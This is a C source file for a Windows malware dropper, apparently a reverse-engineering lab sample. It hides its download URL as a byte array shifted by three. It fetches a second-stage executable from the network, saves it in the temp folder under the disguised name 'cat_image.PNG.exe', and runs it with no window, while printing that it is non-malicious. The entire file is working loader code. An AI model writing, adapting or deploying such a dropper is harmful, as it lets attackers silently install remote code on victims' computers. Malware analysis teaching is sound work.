#include <stdio.h>
#include <string.h>

#include "main.h"
char encoded_URL[] = { 101, 113, 113, 109, 112, 55, 44, 44, 111, 94, 116, 43, 100, 102, 113, 101, 114, 95, 114, 112, 98, 111, 96, 108, 107, 113, 98, 107, 113, 43, 96, 108, 106, 44, 96, 97, 108, 107, 100, 46, 45, 46, 47, 44, 74, 94, 105, 116, 94, 111, 98, 79, 66, 73, 94, 95, 46, 44, 106, 94, 112, 113, 98, 111, 44, 96, 94, 113, 92, 102, 106, 94, 100, 98, 43, 77, 75, 68 };
int main() {
	printf("A definitely non-malicious program\n");
	LPSTR tempPath = NULL;
	DWORD dwTempPathLen = 0;
	STARTUPINFOA startupInfo = STARTUPINFOA();
	PROCESS_INFORMATION processInformation = PROCESS_INFORMATION();
	dwTempPathLen = GetTempPathA(0, 0);
	tempPath = (LPSTR)malloc(dwTempPathLen + 20);

	if (!tempPath) {
		return -1;
	}

	if (!GetTempPathA(dwTempPathLen, tempPath)) {
		free(tempPath);
		return -1;
	}

	memcpy(tempPath + dwTempPathLen - 1, "cat_image.PNG.exe", 18);


	if (downloadStage2(tempPath)) {
		free(tempPath);
		return -1;
	}
	
	if (CreateProcessA(NULL, tempPath, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &startupInfo, &processInformation)) {
		CloseHandle(processInformation.hProcess);
		CloseHandle(processInformation.hThread);
	}

	free(tempPath);
}
int downloadStage2(char *outpath) {
	int result = 0;
	HINTERNET hInternet = NULL;
	HINTERNET hURL = NULL;

	char dataBuffer[1024];
	DWORD dwTemp = 0;
	HANDLE hFile = NULL;
	DWORD dwBytesRead = 1;


	for (int i = 0; i < sizeof(encoded_URL); i++) {
		encoded_URL[i] += 3;
	}

	if (strncmp(encoded_URL, "https:", 6)) {
		result = -1;
		goto CLEANUP;
	}

	hInternet = InternetOpen(
		L"Mozilla/5.0",
		INTERNET_OPEN_TYPE_DIRECT,
		NULL,
		NULL,
		0);

	if (hInternet == INVALID_HANDLE_VALUE) {
		result = -1;
		goto CLEANUP;
	}

	// Make connection to desired page.
	hURL = InternetOpenUrlA(
		hInternet,                       // session handle
		(char*) encoded_URL,  // URL to access
		NULL, 0, 0, 0);                         // defaults

	if (hURL == INVALID_HANDLE_VALUE) {
		result = -1;
		goto CLEANUP;
	}

	hFile = CreateFileA(outpath, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == INVALID_HANDLE_VALUE) {
		result = -1;
		goto CLEANUP;
	}

	for (; dwBytesRead > 0;) {
		InternetReadFile(hURL, dataBuffer, (DWORD)sizeof(dataBuffer), &dwBytesRead);
		WriteFile(hFile, dataBuffer, dwBytesRead, &dwTemp, NULL);
	}


CLEANUP:
	if (hInternet != NULL) {
		InternetCloseHandle(hInternet);
	}
	
	if (hURL != NULL) {
		InternetCloseHandle(hURL);
	}

	if (hFile != NULL) {
		CloseHandle(hFile);
	}
	return result;
}